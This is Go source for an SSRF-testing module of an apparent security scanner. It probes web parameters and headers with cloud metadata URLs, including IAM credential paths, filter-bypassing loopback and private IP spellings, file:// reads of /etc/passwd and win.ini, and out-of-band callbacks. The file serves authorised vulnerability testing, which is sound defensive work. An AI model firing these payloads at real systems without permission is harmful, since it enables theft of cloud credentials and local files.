package ssrf

import (
	"context"
	"fmt"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"time"

	"github.com/Indigo6415/Aperture/internal/collaborator"
	"github.com/Indigo6415/Aperture/internal/fingerprint"
)

// ssrfParams covers parameter-naming conventions for the class of feature
// that actually performs a server-side fetch of an operator-supplied URL:
// webhooks, "import/fetch from URL", avatar/image-from-URL, URL-preview
// generators, and the like -- deliberately narrower than
// openredirect.commonRedirectParams, which is about *navigation* targets
// rather than server-side fetches.
var ssrfParams = []string{
	"url", "uri", "webhook", "webhook_url", "callback", "callback_url", "avatar_url", "image_url", "img_url",
	"src", "feed_url", "fetch_url", "import_url", "proxy_url", "target_url", "source_url", "file_url",
	"document_url", "link", "endpoint", "host", "path", "site",
	"download_url", "load_url", "api_url", "remote", "resource", "data_url",
	// Parameter names from the nuclei SSRF templates (dast/response-ssrf,
	// blind-ssrf), which were collected from real fetch endpoints.
	"continue", "data", "dest", "dir", "domain", "feed", "file", "html", "imgurl", "navigation",
	"next", "open", "out", "page", "port", "redirect", "reference", "return", "show", "to",
	"validate", "view", "window", "val",
}

// moduleMeta describes one check module. headers marks a module that also
// injects its payloads into request headers (see headerProbeNames); the others
// test named parameters only.
type moduleMeta struct {
	id, name, severity string
	headers            bool
}

var cloudMetadataModule = moduleMeta{id: "cloud-metadata", name: "Cloud metadata service reachable", severity: "critical"}
var internalNetworkModule = moduleMeta{id: "internal-network", name: "Internal/loopback network reachable", severity: "high", headers: true}
var fileSchemeModule = moduleMeta{id: "file-scheme", name: "Local file readable via URL scheme", severity: "critical"}
var oobCallbackModule = moduleMeta{id: "oob-callback", name: "Blind SSRF (out-of-band callback)", severity: "critical"}

// blackholeURL is a non-routable address (RFC 5737 TEST-NET-1, reserved for
// documentation -- guaranteed to never correspond to a real, reachable
// host) used as the "the server attempted a fetch and it went nowhere"
// control every internal-network payload is compared against.
const blackholeURL = "http://192.0.2.1/"

// controlURLs are the negative controls for the internal-network module: three
// non-routable addresses. The first is the original blackhole; the other two
// come from TEST-NET ranges (RFC 5737), which are reserved for documentation and
// are never routed. A payload has to differ from all three to count, so one
// odd control response cannot make every payload look anomalous.
var controlURLs = []string{blackholeURL, "http://198.51.100.1/", "http://203.0.113.1/"}

// awsMetadataURL is the AWS instance-metadata root. The same-origin redirect
// bounces below are built around it.
const awsMetadataURL = "http://169.254.169.254/latest/meta-data/"

// cloudMetadataPayload is one metadata endpoint and the provider it belongs to.
type cloudMetadataPayload struct{ provider, url string }

// cloudMetadataPayloads covers every major cloud provider's metadata endpoint
// that a plain GET can read, including the IPv6 and hostname forms that a
// filter keyed on 169.254.169.254 alone would miss. Endpoints that need a
// request header (GCP's Metadata-Flavor, Azure's Metadata) are still included:
// their rejection text names the service, which the signatures match.
var cloudMetadataPayloads = []cloudMetadataPayload{
	{"AWS", awsMetadataURL},
	{"AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
	{"AWS", "http://169.254.169.254/latest/dynamic/instance-identity/document"},
	{"AWS (IPv6 endpoint)", "http://[fd00:ec2::254]/latest/meta-data/"},
	{"GCP", "http://169.254.169.254/computeMetadata/v1/?recursive=true"},
	{"GCP", "http://metadata.google.internal/computeMetadata/v1/?recursive=true"},
	{"Azure", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"},
	{"DigitalOcean", "http://169.254.169.254/metadata/v1/"},
	{"Alibaba Cloud", "http://100.100.100.200/latest/meta-data/"},
	{"Alibaba Cloud", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"},
	{"Oracle Cloud", "http://169.254.169.254/opc/v1/instance/"},
	{"Tencent Cloud", "http://metadata.tencentyun.com/latest/meta-data/"},
	{"DigitalOcean", "http://169.254.169.254/metadata/v1"},
	{"OpenStack", "http://169.254.169.254/openstack/latest/meta_data.json"},
}

// cloudBouncePaths are common same-origin redirect endpoints. A filter that
// only allows the target's own host will pass a URL pointing at one of these,
// and the endpoint then follows the redirect to the metadata address. Each
// path is only tried with the AWS identity payload.
var cloudBouncePaths = []string{"/redirect", "/redir", "/goto", "/out"}

// cloudMetadataSignatureRe matches content that could only plausibly come
// from having actually reached a cloud metadata service -- including each
// provider's own rejection body (GCP/Azure both require a header no
// application-level SSRF payload can add, but even that rejection text
// confirms the metadata IP was reached).
//
// Deliberately excludes "computemetadata": that string is a literal substring
// of the GCP payload's own URL, so any page that merely echoes the submitted
// URL back matches it without the server ever having fetched anything.
// "metadata-flavor" (GCP's actual missing-header rejection body) still catches
// a real GCP hit. A match only counts when it is also absent from the control
// responses -- see novelMatches.
//
// The tree-shaped listings from the nuclei templates ("app-id ... placement/",
// "dns-conf/ ... instance/", "ami-id ... placement/") are bounded to a short
// span. An unbounded span would match across a whole ordinary page.
var cloudMetadataSignatureRe = regexp.MustCompile(`(?i)(ami-id|instance-id|iam/security-credentials|ram/security-credentials|accesskeyid|placement/availability-zone|metadata-flavor|required metadata header not specified|"project-id"|"compute"\s*:|azenvironment|subscriptionid|droplet_id|"region"\s*:\s*"[a-z0-9-]+"\s*,\s*"droplet|"instanceId"\s*:\s*"i-[0-9a-f]+"|"accountId"\s*:\s*"[0-9]{12}"|"compartmentId"|"availabilityDomain"|"availability_zone"\s*:|app-id[\s\S]{0,200}?placement/|ami-id[\s\S]{0,200}?placement/|dns-conf/[\s\S]{0,200}?instance/)`)

// ipPayload is one internal-address spelling and what it is meant to get past.
type ipPayload struct{ description, url string }

// internalIPPayloads covers loopback, private, and link-local targets written
// in every spelling a naive filter might miss: numeric forms (decimal, hex,
// octal, zero-padded, shorthand), IPv4-mapped IPv6, trailing-dot and
// upper-case hostnames, public DNS names that resolve to loopback, userinfo
// parser confusion, and scheme case. Each payload is judged against the
// controls, so a spelling the server does not resolve adds nothing.
var internalIPPayloads = []ipPayload{
	{"loopback", "http://127.0.0.1/"},
	{"loopback, another address in 127/8", "http://127.0.0.2/"},
	{"loopback hostname", "http://localhost/"},
	{"loopback hostname with a trailing dot (bypasses an exact-match filter)", "http://localhost./"},
	{"loopback hostname in upper case (bypasses a case-sensitive filter)", "http://LOCALHOST/"},
	{"unspecified address", "http://0.0.0.0/"},
	{"zero (resolves to loopback on Linux)", "http://0/"},
	{"IPv6 loopback", "http://[::1]/"},
	{"IPv4-mapped IPv6 loopback", "http://[::ffff:127.0.0.1]/"},
	{"IPv4-mapped IPv6 loopback, hex", "http://[::ffff:7f00:1]/"},
	{"decimal-encoded loopback (bypasses a literal \"127.0.0.1\" string filter)", "http://2130706433/"},
	{"hex-encoded loopback (bypasses a literal-string filter)", "http://0x7f000001/"},
	{"octal-encoded loopback (bypasses a literal-string filter)", "http://0177.0.0.1/"},
	{"octal-encoded loopback, every octet written out", "http://0177.0000.0000.0001/"},
	{"zero-padded decimal loopback", "http://127.000.000.001/"},
	{"mixed hex and decimal loopback", "http://0x7f.0.0.1/"},
	{"shorthand loopback (bypasses a literal-string filter)", "http://127.1/"},
	{"public-DNS-resolved loopback (bypasses a hostname-equality filter that never resolves the value)", "http://127.0.0.1.nip.io/"},
	{"public-DNS-resolved loopback, dashed form", "http://127-0-0-1.sslip.io/"},
	{"public-DNS name that resolves to loopback", "http://localtest.me/"},
	{"userinfo confusion (a filter reads the host as example.com; the fetch goes to loopback)", "http://example.com@127.0.0.1/"},
	{"private range (RFC 1918, 10/8)", "http://10.0.0.1/"},
	{"private range (RFC 1918, 172.16/12)", "http://172.16.0.1/"},
	{"private range (RFC 1918, 192.168/16)", "http://192.168.0.1/"},
	{"IPv6 unique-local address", "http://[fd00::1]/"},
	{"upper-case scheme (bypasses a case-sensitive scheme check)", "HTTP://127.0.0.1/"},
	{"HTTPS to loopback (bypasses a plain-http-only check)", "https://127.0.0.1/"},
	// Loopback service ports from the nuclei response-ssrf template. A server
	// that connects to them answers differently from an unreachable address,
	// even though none of these speak HTTP.
	{"loopback, SSH port", "http://127.0.0.1:22"},
	{"loopback, MySQL port", "http://127.0.0.1:3306"},
	{"loopback, Redis port", "http://127.0.0.1:6379"},
}

// filePayload is one file:// URL and the content signature that proves the
// server read it.
type filePayload struct {
	description, url string
	sig              *regexp.Regexp
}

// fileSchemePayloads are two read-only file:// reads. Each targets a file that
// exists on nearly every host of its operating system, and each has a distinct
// content signature.
var fileSchemePayloads = []filePayload{
	{"Unix password file", "file:///etc/passwd", regexp.MustCompile(`root:[x*]:0:0:`)},
	{"Windows win.ini", "file:///c:/windows/win.ini", regexp.MustCompile(`(?i)\[(fonts|extensions)\]`)},
	// Dot-segment spellings from the nuclei response-ssrf template. They reach
	// the same file past a filter that matches the literal path.
	{"Unix password file (dot segments)", "file:////./etc/./passwd", regexp.MustCompile(`root:.*?:[0-9]*:[0-9]*:`)},
	{"Windows win.ini (dot segments)", "file:///c:/./windows/./win.ini", regexp.MustCompile(`(?i)\[(fonts|extensions)\]`)},
}

// minEchoLength is the shortest spelling scrubbed out of a body. A shorter one
// ("0", "::1") also occurs in ordinary page text, and scrubbing it would damage
// the bodies being compared.
const minEchoLength = 5

// originOf returns scheme://host for target, the base the bounce URLs hang off.
func originOf(target *url.URL) string {
	return target.Scheme + "://" + target.Host
}

// bounceURL is a same-origin URL that redirects to inner: origin + path with
// inner passed as the url parameter the endpoint reads.
func bounceURL(origin, path, inner string) string {
	return origin + path + "?url=" + inner
}

// reflectionForms returns the spellings a server might echo value back in: the
// raw value, its query- and path-escaped forms, its HTML-escaped form, and its
// JSON-escaped form with slashes escaped.
func reflectionForms(value string) []string {
	return []string{
		value,
		url.QueryEscape(value),
		url.PathEscape(value),
		htmlEscape(value),
		strings.ReplaceAll(value, "/", `\/`),
	}
}

// htmlEscape escapes the characters an HTML page would encode in an attribute or
// text echo of a URL.
func htmlEscape(s string) string {
	return strings.NewReplacer("&", "&amp;", "<", "&lt;", ">", "&gt;", `"`, "&quot;", "'", "&#39;").Replace(s)
}

// echoesFor lists every spelling of the scanner's own payloads that a server
// could echo back: each payload and control in every reflection form, plus the
// host and hostname of each. The list is sorted longest first, so a long echo
// is removed whole before any shorter piece of it could be matched.
func echoesFor(target *url.URL) []string {
	var values []string
	for _, p := range cloudMetadataPayloads {
		values = append(values, p.url)
	}
	for _, p := range internalIPPayloads {
		values = append(values, p.url)
	}
	for _, p := range fileSchemePayloads {
		values = append(values, p.url)
	}
	values = append(values, controlURLs...)
	values = append(values, protocolProbeURLs()...)
	for _, path := range cloudBouncePaths {
		values = append(values, bounceURL(originOf(target), path, awsMetadataURL))
	}
	return echoForms(values)
}

// echoForms expands values into their reflection forms, host and hostname,
// without duplicates, dropping any spelling shorter than minEchoLength, and
// sorts the result longest first.
func echoForms(values []string) []string {
	seen := map[string]bool{}
	var out []string
	add := func(s string) {
		if len(s) < minEchoLength || seen[s] {
			return
		}
		seen[s] = true
		out = append(out, s)
	}
	for _, v := range values {
		for _, f := range reflectionForms(v) {
			add(f)
		}
		if u, err := url.Parse(v); err == nil && u.Host != "" {
			add(u.Host)
			add(u.Hostname())
		}
	}
	sort.SliceStable(out, func(i, j int) bool { return len(out[i]) > len(out[j]) })
	return out
}

// scrubEchoes removes every echo spelling from body. A page that reflects the
// submitted value looks the same whichever value it was, after this.
func scrubEchoes(body string, echoes []string) string {
	// Each echo is removed in turn. The list is longest first, so a long echo
	// goes before any shorter piece of it.
	for _, e := range echoes {
		body = strings.ReplaceAll(body, e, "")
	}
	return body
}

// scrubResult returns a copy of res with its body scrubbed of echoes. The
// status and every other field are left as they were.
func scrubResult(res *ssrfResult, echoes []string) *ssrfResult {
	if res == nil {
		return nil
	}
	cp := *res
	cp.Body = scrubEchoes(res.Body, echoes)
	return &cp
}

// normalBodies returns the scrubbed bodies a point's normal responses show: each
// non-routable control that completed, and the primary baseline. Text found in
// any of them shows up whatever the value was, so a match there is not evidence
// of a fetch.
func normalBodies(ctx context.Context, deps runDeps, pt probePoint) []string {
	var out []string
	for _, c := range deps.controlsFor(ctx, pt) {
		if c != nil && c.Err == nil {
			out = append(out, c.Body)
		}
	}
	if deps.baseline != "" {
		out = append(out, scrubEchoes(deps.baseline, deps.echoes))
	}
	return out
}

// novelMatches returns the distinct matches of re in body that do not appear in
// any of the normal bodies. A match the page shows on every request cannot be
// evidence of anything the request caused.
func novelMatches(re *regexp.Regexp, body string, normal []string) []string {
	var out []string
	seen := map[string]bool{}
	for _, m := range re.FindAllString(body, -1) {
		// Each distinct match is judged once.
		if seen[m] {
			continue
		}
		seen[m] = true
		if !anyContainsFold(normal, m) {
			out = append(out, m)
		}
	}
	return out
}

// anyContainsFold reports whether any body contains s, ignoring case. Signature
// matches are case-insensitive, so the comparison is too.
func anyContainsFold(bodies []string, s string) bool {
	lower := strings.ToLower(s)
	for _, b := range bodies {
		if strings.Contains(strings.ToLower(b), lower) {
			return true
		}
	}
	return false
}

// describePoint renders a point and the value sent to it for a Finding's Detail.
func describePoint(pt probePoint, value string) string {
	if pt.header {
		return fmt.Sprintf("the %s header to %s", pt.name, hostOf(value))
	}
	return fmt.Sprintf("parameter %s=%s", pt.name, value)
}

// runPointChecks runs check once per point that mod targets, with at most
// checkConcurrency checks in flight, bracketing each with progress Start/Done
// reports. A check's square only turns "testing" once it actually gets a slot,
// so anything still waiting for one correctly reads as queued. Findings from
// every check are merged into one slice.
func runPointChecks(deps runDeps, mod moduleMeta, check func(pt probePoint) []Finding) []Finding {
	var mu sync.Mutex
	var out []Finding
	var wg sync.WaitGroup
	slots := make(chan struct{}, checkConcurrency)
	for _, pt := range deps.pointsFor(mod) {
		wg.Add(1)
		go func(pt probePoint) {
			defer wg.Done()
			slots <- struct{}{}
			defer func() { <-slots }()

			id := deps.check(mod, pt).ID
			deps.rep.Start(id)
			found := check(pt)
			deps.rep.Done(id, len(found), nil)

			mu.Lock()
			out = append(out, found...)
			mu.Unlock()
		}(pt)
	}
	wg.Wait()
	return out
}

// cloudProbe is one cloud-metadata request: a direct payload, or the AWS
// identity payload routed through a same-origin redirect (bounce non-empty).
type cloudProbe struct {
	provider, url, bounce string
}

// cloudProbes returns every direct metadata payload followed by the bounce
// variants for target.
func cloudProbes(target *url.URL) []cloudProbe {
	out := make([]cloudProbe, 0, len(cloudMetadataPayloads)+len(cloudBouncePaths))
	for _, p := range cloudMetadataPayloads {
		out = append(out, cloudProbe{provider: p.provider, url: p.url})
	}
	for _, path := range cloudBouncePaths {
		out = append(out, cloudProbe{provider: "AWS", url: bounceURL(originOf(target), path, awsMetadataURL), bounce: path})
	}
	return out
}

// runCloudMetadataModule fires every metadata probe at every parameter and
// reports a response whose body carries a metadata signature that the normal
// responses do not carry. The signature is judged against the point's own
// controls and baseline, so a page that documents metadata keys is not reported.
func runCloudMetadataModule(ctx context.Context, deps runDeps) []Finding {
	return runPointChecks(deps, cloudMetadataModule, func(pt probePoint) []Finding {
		normal := normalBodies(ctx, deps, pt)
		probes := cloudProbes(deps.target)

		var mu sync.Mutex
		var out []Finding
		var wg sync.WaitGroup
		for _, probe := range probes {
			wg.Add(1)
			go func(probe cloudProbe) {
				defer wg.Done()
				res := fetchPointThrottled(ctx, deps, pt, probe.url)
				if res.Err != nil {
					return
				}
				hits := novelMatches(cloudMetadataSignatureRe, scrubEchoes(res.Body, deps.echoes), normal)
				if len(hits) == 0 {
					return
				}
				f := cloudFinding(pt, deps.method, probe, hits[0], res)
				mu.Lock()
				out = append(out, f)
				mu.Unlock()
			}(probe)
		}
		wg.Wait()
		return out
	})
}

// cloudFinding builds the finding for one metadata response. A bounce probe
// names the redirect endpoint it went through, since that is how the metadata
// was reached.
func cloudFinding(pt probePoint, method string, probe cloudProbe, evidence string, res *ssrfResult) Finding {
	label := fmt.Sprintf("Parameter %q reaches the %s metadata service", pt.name, probe.provider)
	detail := fmt.Sprintf("Set %s and the response body contains content matching known %s metadata-service output -- the server fetched this URL itself. If this reflects the full response, check for exposed instance credentials (IAM role keys, a service-account token, ...).", describePoint(pt, probe.url), probe.provider)
	if probe.bounce != "" {
		label = fmt.Sprintf("Parameter %q reaches the %s metadata service through a same-origin redirect (%s)", pt.name, probe.provider, probe.bounce)
		detail = fmt.Sprintf("Set %s. That URL sits on the target's own host and redirects to the %s metadata service; the server followed the redirect and returned metadata content. An allowlist that checks only the host of the submitted URL is bypassed this way.", describePoint(pt, probe.url), probe.provider)
	}
	return Finding{
		Label:      label,
		Detail:     detail,
		Evidence:   truncateEvidence(evidence),
		Method:     method,
		StatusCode: res.StatusCode,
		Request:    &res.Request,
		Confidence: ConfidenceConfirmed,
	}
}

// runInternalNetworkModule fires each internal-address payload at every point
// and flags the ones that answer differently from all controls. A report then
// has to reproduce on a second send, which drops one-off transient responses.
// Each point's own controls are used, so a point's behavior is only ever judged
// against itself.
func runInternalNetworkModule(ctx context.Context, deps runDeps) []Finding {
	return runPointChecks(deps, internalNetworkModule, func(pt probePoint) []Finding {
		controls := deps.controlsFor(ctx, pt)

		var mu sync.Mutex
		var out []Finding
		var wg sync.WaitGroup
		for _, payload := range internalIPPayloads {
			wg.Add(1)
			go func(payload ipPayload) {
				defer wg.Done()
				res := fetchPointThrottled(ctx, deps, pt, payload.url)
				if res.Err != nil {
					return
				}
				reason, anomalous := differsFromControls(scrubResult(res, deps.echoes), controls)
				if !anomalous {
					return
				}
				// Reproduce before reporting: a second identical send must show
				// the same difference, or the first response was transient. A
				// second send that errors out is not a reproduction either.
				again := fetchPointThrottled(ctx, deps, pt, payload.url)
				if again.Err != nil {
					return
				}
				if _, repeated := differsFromControls(scrubResult(again, deps.echoes), controls); !repeated {
					return
				}
				f := internalFinding(pt, deps.method, payload, reason, res)
				mu.Lock()
				out = append(out, f)
				mu.Unlock()
			}(payload)
		}
		wg.Wait()
		return out
	})
}

// internalFinding builds the finding for one reproduced internal-address
// difference. A header point gets heuristic confidence, since a virtual-host
// router can answer an unfamiliar host name differently without making any
// request onward.
func internalFinding(pt probePoint, method string, payload ipPayload, reason string, res *ssrfResult) Finding {
	label := fmt.Sprintf("Parameter %q possibly reaches an internal address (%s)", pt.name, payload.description)
	confidence := ConfidenceLikely
	if pt.header {
		label = fmt.Sprintf("Header %q possibly routes to an internal address (%s)", pt.name, payload.description)
		confidence = ConfidenceHeuristic
	}
	detail := fmt.Sprintf("Set %s and the response %s compared to every non-routable control, and the difference reproduced on a second send. That suggests the server actually connected somewhere, rather than failing as it does for addresses it can never reach. Not conclusive on its own; verify manually or via the out-of-band module's confirmation.", describePoint(pt, payload.url), reason)
	if pt.header {
		detail += " This is a header-based signal: a virtual-host router may answer an unfamiliar host differently without fetching anything, so treat it as a lead."
	}
	return Finding{
		Label:      label,
		Detail:     detail,
		Evidence:   fmt.Sprintf("payload: %d/%db in %v", res.StatusCode, res.ContentLength, res.Latency.Round(time.Millisecond)),
		Method:     method,
		StatusCode: res.StatusCode,
		Request:    &res.Request,
		Confidence: confidence,
	}
}

// runFileSchemeModule sends each file:// payload at every parameter and reports
// a response whose body carries the file's own signature, when the normal
// responses do not carry it.
func runFileSchemeModule(ctx context.Context, deps runDeps) []Finding {
	return runPointChecks(deps, fileSchemeModule, func(pt probePoint) []Finding {
		normal := normalBodies(ctx, deps, pt)

		var mu sync.Mutex
		var out []Finding
		var wg sync.WaitGroup
		for _, fp := range fileSchemePayloads {
			wg.Add(1)
			go func(fp filePayload) {
				defer wg.Done()
				res := fetchPointThrottled(ctx, deps, pt, fp.url)
				if res.Err != nil {
					return
				}
				hits := novelMatches(fp.sig, scrubEchoes(res.Body, deps.echoes), normal)
				if len(hits) == 0 {
					return
				}
				mu.Lock()
				out = append(out, Finding{
					Label: fmt.Sprintf("Parameter %q reads local files through a file:// URL (%s)", pt.name, fp.description),
					Detail: fmt.Sprintf(
						"Set %s and the response contains content that only that file holds (%s), which the page does not show for any other input. The server opened a local file on the attacker's behalf.",
						describePoint(pt, fp.url), fp.description,
					),
					Evidence:   truncateEvidence(hits[0]),
					Method:     deps.method,
					StatusCode: res.StatusCode,
					Request:    &res.Request,
					Confidence: ConfidenceConfirmed,
				})
				mu.Unlock()
			}(fp)
		}
		wg.Wait()
		return out
	})
}

// differsFromControls reports whether res differs from every control. It
// returns the first control's reason, so the finding can say what changed.
func differsFromControls(res *ssrfResult, controls []*ssrfResult) (string, bool) {
	if len(controls) == 0 {
		return "", false
	}
	var first string
	for i, c := range controls {
		reason, differs := differsFromControl(res, c)
		if !differs {
			return "", false
		}
		if i == 0 {
			first = reason
		}
	}
	return first, true
}

// differsFromControl reports whether res looks like it landed somewhere the
// control didn't. A different status code is a difference. For a matching
// status, the bodies are compared by content (fingerprint.Similar), not by raw
// length, because dynamic pages change length on every request.
func differsFromControl(res, control *ssrfResult) (reason string, anomalous bool) {
	if control == nil || control.Err != nil {
		// The control errored or timed out, which is the common case for a
		// non-routable address. A payload that got a clean response at all is
		// already the anomaly.
		if res.StatusCode != 0 {
			return "succeeded where the control errored out entirely", true
		}
		return "", false
	}
	if res.StatusCode != control.StatusCode {
		return fmt.Sprintf("returned HTTP %d vs the control's %d", res.StatusCode, control.StatusCode), true
	}
	resObs := fingerprint.Observe(res.StatusCode, "", []byte(res.Body))
	ctlObs := fingerprint.Observe(control.StatusCode, "", []byte(control.Body))
	if !fingerprint.Similar(resObs, ctlObs) {
		return "returned a body whose content differs from the control's", true
	}
	return "", false
}

// runOOBCallbackModule points every candidate parameter at an OOB
// callback address, fires every probe concurrently, waits for callbacks to settle (see collaborator.WaitForCallbacks)
// for an asynchronous fetch to land, then polls for a hit -- any hit
// confirms that parameter actually made the server perform the fetch,
// independent of anything visible in the HTTP response this scanner itself
// received. This is the only module here that can confirm a fully blind
// SSRF.
//
// Without oob.SharedToken, this mints one throwaway collaborator token per
// parameter (today's original behavior, unchanged): tokens themselves tell
// parameters apart, so no further disambiguation is needed. With
// oob.SharedToken (an operator-picked, long-lived server from their own
// Callback picker), every parameter instead shares that one token and is
// told apart by an embedded Identifier (see collaborator.Interaction) --
// letting a human watch the single listener in the Collaborator tab across
// an entire scan, and across other scanners/tests reusing the same server.
func runOOBCallbackModule(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	if oob.SharedToken != "" {
		return runOOBCallbackModuleShared(ctx, deps, oob)
	}

	if oob.Registry == nil || oob.CallbackBaseURL == "" {
		return []Finding{{
			Label:  "Out-of-band callback listener not configured",
			Detail: "This module confirms a blind SSRF (one with no visible signal in the endpoint's own response) by pointing payloads at Aperture's own collaborator listener and checking whether the server called back. Configure a collaborator domain/answer IP in Settings to enable it.",
		}}
	}

	client := newClient()
	type tokenInfo struct {
		pt    probePoint
		token string
		urls  []string
	}
	points := deps.pointsFor(oobCallbackModule)
	infos := make([]tokenInfo, len(points))
	for i, pt := range points {
		token := oob.Registry.NewToken()
		urls := []string{strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + token + "/"}
		if oob.DNSDomain != "" {
			urls = append(urls, "http://"+token+"."+oob.DNSDomain+"/")
		}
		infos[i] = tokenInfo{pt: pt, token: token, urls: urls}
	}

	// Every parameter's check is in flight from here until the callback wait
	// below settles -- they all share that one wait, so they all read as
	// testing together and finish together.
	for _, info := range infos {
		deps.rep.Start(deps.check(oobCallbackModule, info.pt).ID)
	}

	var wg sync.WaitGroup
	for _, info := range infos {
		for _, u := range info.urls {
			wg.Add(1)
			go func(pt probePoint, u string) {
				defer wg.Done()
				fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, pt.name, u, deps.req.Headers)
			}(info.pt, u)
		}
	}
	wg.Wait()

	tokens := make([]string, 0, len(infos))
	for _, info := range infos {
		tokens = append(tokens, info.token)
	}
	deps.rep.Phase("Waiting for out-of-band callbacks")
	collaborator.WaitForRegistry(ctx, oob.Registry, tokens, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)

	var out []Finding
	for _, info := range infos {
		id := deps.check(oobCallbackModule, info.pt).ID
		hits := oob.Registry.Poll(info.token)
		if len(hits) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		h := hits[0]
		f := ssrfOOBFinding(info.pt.name, hits, h)
		f.Confidence = ConfidenceConfirmed
		out = append(out, f)
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// ssrfIdentifierFor derives a stable, DNS-label-and-URL-path-safe identifier
// for param -- used only on the oob.SharedToken path, where many parameters
// share one token and need to stay distinguishable in both an HTTP path
// segment and a DNS label.
func ssrfIdentifierFor(param string) string {
	var b strings.Builder
	b.WriteString("ssrf-")
	for _, r := range param {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
		case r >= 'A' && r <= 'Z':
			b.WriteRune(r + ('a' - 'A'))
		default:
			b.WriteByte('-')
		}
	}
	return b.String()
}

// runOOBCallbackModuleShared is runOOBCallbackModule's oob.SharedToken path
// -- see that function's doc comment.
func runOOBCallbackModuleShared(ctx context.Context, deps runDeps, oob OOBConfig) []Finding {
	client := newClient()
	type paramInfo struct {
		pt         probePoint
		identifier string
		urls       []string
	}
	points := deps.pointsFor(oobCallbackModule)
	infos := make([]paramInfo, len(points))
	for i, pt := range points {
		identifier := ssrfIdentifierFor(pt.name)
		var urls []string
		if oob.SharedProvider == "webhooksite" {
			urls = []string{collaborator.WebhookSiteCallbackURL(oob.SharedToken) + "/" + identifier + "/"}
		} else {
			urls = []string{strings.TrimRight(oob.CallbackBaseURL, "/") + "/collab/" + oob.SharedToken + "/" + identifier + "/"}
			if oob.DNSDomain != "" {
				urls = append(urls, "http://"+identifier+"."+oob.SharedToken+"."+oob.DNSDomain+"/")
			}
		}
		infos[i] = paramInfo{pt: pt, identifier: identifier, urls: urls}
	}

	// Same shared-wait accounting as the per-token path above: every check
	// is in flight until the one callback wait settles.
	for _, info := range infos {
		deps.rep.Start(deps.check(oobCallbackModule, info.pt).ID)
	}

	var wg sync.WaitGroup
	for _, info := range infos {
		for _, u := range info.urls {
			wg.Add(1)
			go func(pt probePoint, u string) {
				defer wg.Done()
				fetchParamThrottled(ctx, deps.sem, client, deps.target, deps.method, pt.name, u, deps.req.Headers)
			}(info.pt, u)
		}
	}
	wg.Wait()

	deps.rep.Phase("Waiting for out-of-band callbacks")
	var hits []collaborator.Interaction
	var err error
	if oob.SharedProvider == "webhooksite" {
		hits, err = collaborator.WaitForCallbacks(ctx, func(c context.Context) ([]collaborator.Interaction, error) {
			return collaborator.PollWebhookSite(c, oob.SharedToken)
		}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
	} else if oob.Registry != nil {
		collaborator.WaitForRegistry(ctx, oob.Registry, []string{oob.SharedToken}, collaborator.DefaultPollInterval, collaborator.DefaultQuietPeriod, collaborator.DefaultMaxWait)
		hits = oob.Registry.Poll(oob.SharedToken)
	}
	// A failed poll discards whatever it returned, same as before -- every
	// parameter then reads as "no callback", not as a partial result.
	if err != nil {
		hits = nil
	}

	// Group every polled hit by which test's Identifier it carries, so a
	// shared token's interleaved traffic can still be attributed back to
	// the one parameter that caused it.
	byIdentifier := map[string][]collaborator.Interaction{}
	for _, h := range hits {
		byIdentifier[h.Identifier] = append(byIdentifier[h.Identifier], h)
	}

	var out []Finding
	for _, info := range infos {
		id := deps.check(oobCallbackModule, info.pt).ID
		matched := byIdentifier[info.identifier]
		if len(matched) == 0 {
			deps.rep.Done(id, 0, nil)
			continue
		}
		f := ssrfOOBFinding(info.pt.name, matched, matched[0])
		f.Confidence = ConfidenceConfirmed
		out = append(out, f)
		deps.rep.Done(id, 1, nil)
	}
	return out
}

// ssrfOOBFinding builds the Finding every confirmed-hit path above returns,
// given param's full hit list and its first (earliest) hit h.
func ssrfOOBFinding(param string, hits []collaborator.Interaction, h collaborator.Interaction) Finding {
	return Finding{
		Label: fmt.Sprintf("Parameter %q triggered a blind out-of-band callback", param),
		Detail: fmt.Sprintf(
			"Pointed %s at an Aperture-controlled callback address and received %d inbound %s interaction(s) back, the first from %s -- confirms the server itself fetched the attacker-supplied URL, regardless of what (if anything) showed up in its HTTP response to this scan.",
			param, len(hits), h.Protocol, h.RemoteAddr,
		),
		Evidence: fmt.Sprintf("%s callback from %s at %s", h.Protocol, h.RemoteAddr, h.Timestamp.Format(time.RFC3339)),
		Method:   "GET",
		// Built only from a collaborator hit, so the callback proves it.
		Callback: true,
	}
}

// truncateEvidence shortens s to at most 300 bytes, marking the cut with an
// ellipsis, so a large matched body does not bloat the finding.
func truncateEvidence(s string) string {
	const max = 300
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}
